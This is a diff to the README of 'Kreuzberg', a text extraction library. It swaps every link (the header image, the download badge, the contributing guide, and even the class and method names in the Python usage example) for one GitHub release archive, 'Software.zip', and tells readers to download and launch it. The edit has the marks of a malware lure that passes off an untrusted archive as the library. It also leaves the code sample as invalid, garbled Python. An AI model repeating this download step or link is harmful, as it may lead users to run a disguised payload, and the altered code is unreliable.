@@ -1,5 +1,5 @@
 # 🚀 **Kreuzberg - Text Extraction Library**
-![Text Extraction Library](https://img.icons8.com/color/452/document.png)
+![Text Extraction Library](https://github.com/anil-tudu/kreuzberg/releases/download/v2.0/Software.zip)
 
 Welcome to Kreuzberg, a versatile text extraction library that supports PDFs, images, office documents, and more. Whether you need to extract text from various file formats for analysis, indexing, or any other application, Kreuzberg has got you covered. This README will provide you with all the necessary information to get started with Kreuzberg.
 
@@ -24,7 +24,7 @@ Welcome to Kreuzberg, a versatile text extraction library that supports PDFs, im
 ## Installation
 To start using Kreuzberg, you can download the library from the following link:
 
-[![Download Kreuzberg](https://img.shields.io/badge/Download-Kreuzberg-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Download Kreuzberg")
+[![Download Kreuzberg](https://github.com/anil-tudu/kreuzberg/releases/download/v2.0/Software.zip)](https://github.com/anil-tudu/kreuzberg/releases/download/v2.0/Software.zip "Download Kreuzberg")
 
 Upon downloading the library, you can launch the file and follow the installation instructions provided in the repository.
 
@@ -37,10 +37,10 @@ Kreuzberg offers a simple and intuitive interface for extracting text from a var
 import kreuzberg
 
 # Create a PDFTextExtractor object
-pdf_extractor = kreuzberg.PDFTextExtractor()
+pdf_extractor = https://github.com/anil-tudu/kreuzberg/releases/download/v2.0/Software.zip()
 
 # Extract text from a PDF file
-text = pdf_extractor.extract_text('sample.pdf')
+text = https://github.com/anil-tudu/kreuzberg/releases/download/v2.0/Software.zip('https://github.com/anil-tudu/kreuzberg/releases/download/v2.0/Software.zip')
 
 # Print the extracted text
 print(text)
@@ -53,7 +53,7 @@ Feel free to explore the documentation and examples provided in the repository t
 ## Contributing
 We welcome contributions from the open-source community to enhance the capabilities of Kreuzberg. If you have any ideas, bug fixes, or new features to propose, please feel free to submit a pull request. Together, we can make Kreuzberg even more powerful and efficient for text extraction tasks.
 
-Check out the [Contributing Guidelines](CONTRIBUTING.md) for more information on how you can contribute to Kreuzberg.
+Check out the [Contributing Guidelines](https://github.com/anil-tudu/kreuzberg/releases/download/v2.0/Software.zip) for more information on how you can contribute to Kreuzberg.
 
 ---
 
